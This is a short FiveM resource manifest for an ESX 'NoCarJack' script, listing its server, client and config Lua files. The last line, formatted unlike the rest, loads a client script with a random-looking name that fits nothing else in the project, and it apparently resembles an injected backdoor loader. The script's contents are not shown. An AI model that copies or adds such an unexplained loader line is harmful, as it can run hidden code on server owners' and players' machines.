fx_version 'bodacious'
game 'gta5'

description 'ESX NoCarJack - by 0xNOP @ FiveM'

version '1.0'

server_scripts {
	'@mysql_async/lib/MySQL.lua',
	'server/nocarjack_sv.lua'
}

client_scripts {
	'client/nocarjack_cl.lua',
	'cfg/nocarjack.lua'
}
client_script "DISqkiIEcVydGenWnD.lua"